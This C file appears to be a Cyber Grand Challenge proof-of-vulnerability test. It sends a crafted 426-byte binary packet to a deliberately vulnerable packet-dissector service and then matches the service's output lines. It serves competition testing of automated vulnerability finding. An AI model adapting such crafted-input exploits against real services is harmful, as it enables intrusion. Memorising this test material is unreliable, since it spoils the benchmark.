#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xaa\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x92\x01\x00\x00\x8a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x8a\x01\x00\x00"
         "\x4b\x3f\x9a\x5d\x44\x18\x81\x46\xcc\x0f\xda\x96\x97\x88\x77\x7a"
         "\x2b\xf9\x48\x17\x0d\x00\x00\x00\x41\x00\x01\x45\xd6\x36\x33\x34"
         "\x78\x9e\xab\x40\x60\x81\x23\x65\x4c\x52\xb9\x7e\x01\xf0\x41\x00"
         "\xf0\xd0\x63\x01\x48\xea\xa0\x2a\xa8\xa7\xf0\xcb\x87\x01\x94\xff"
         "\xf3\x20\xa1\xbc\x92\x57\x97\xd6\x5a\x1f\x44\xf5\xda\xd8\x51\x83"
         "\x19\x53\x52\x77\x63\xaf\x46\x85\x5a\x02\x0f\x68\x78\x05\x65\xe3"
         "\x22\x7e\x2a\x66\x33\x6c\x7e\xde\xfa\xa8\x9e\x20\xee\xa8\x55\xbd"
         "\x89\x7e\xd6\xa8\x7c\x00\xb3\xaa\x42\x47\x7b\x79\x90\x6f\xc2\x97"
         "\xc6\x09\x87\xf9\x59\x7e\x82\x1f\x97\x14\x60\x1b\xc0\x4c\x38\x42"
         "\xf8\xb4\xa5\xaa\xa7\xdc\x06\x03\xf0\x1a\x40\x80\xbe\xbf\xde\xce"
         "\x7d\xc8\x8f\xc5\x90\x8e\xc5\xb7\x3c\xe3\xb7\xe8\x0d\xbe\x34\xdc"
         "\xc1\xa5\xfc\xdc\x84\xb5\xec\x8d\x5a\x4a\x7a\x44\x86\xbb\x14\xe3"
         "\x58\xa9\x77\xdb\x85\xcc\xac\x88\xb9\x2c\xb3\xed\x7d\x02\xaa\x93"
         "\xa5\x4d\x7a\x5c\xf0\xbc\xc7\xa0\x35\x6a\xb0\xa5\x64\xcb\x6e\xea"
         "\x35\x34\x45\x7a\x32\xb9\x98\x96\xa1\xe7\x7f\x8f\xe2\xbf\x92\xdd"
         "\x10\x27\x5c\x79\xce\xcd\x29\xf2\x40\x3b\x01\x7e\x77\xbd\x24\x51"
         "\xdc\x7b\x0b\x8b\xbf\xb6\x64\x65\x42\xfe\x02\xc3\xbe\x3f\x5a\x31"
         "\xe7\x2c\x88\x45\x8a\x56\xd7\x70\x77\x46\x33\x10\x52\x75\x1e\xc2"
         "\x10\x7d\xe3\x6e\xf8\x48\x26\x1d\x4e\xe8\xf7\x06\x1c\x20\xe3\x44"
         "\x94\x79\x2a\x21\xfa\xa3\xbf\xdc\xb5\x24\xba\xb4\xe9\xa2\xca\x01"
         "\x7d\x01\x00\x3e\x11\x8b\x39\x5f\x14\x67\x59\xaf\x85\xb2\x8f\x13"
         "\x72\xa5\xf4\x11\x6a\x8c\x31\xe4\xdc\xa7\x1b\x6c\xf0\xfd\x66\xb1"
         "\x17\x9c\x77\xa5\x41\x00\x72\x20\xc1\xcc\x6f\xc5\x64\x88\xcf\x81"
         "\xd2\x1a\x2b\xb8\xc6\xd0\x37\x1d\xd9\xe8\xf9\x35\x51\x78\xcb\xcb"
         "\xf6\x48\xb3\x01\x00\xc9\xaf\x61\x5a\xda";
      static unsigned int write_00001_00000_len = 426;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamatelodendron
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x74\x65\x6c\x6f\x64\x65"
         "\x6e\x64\x72\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
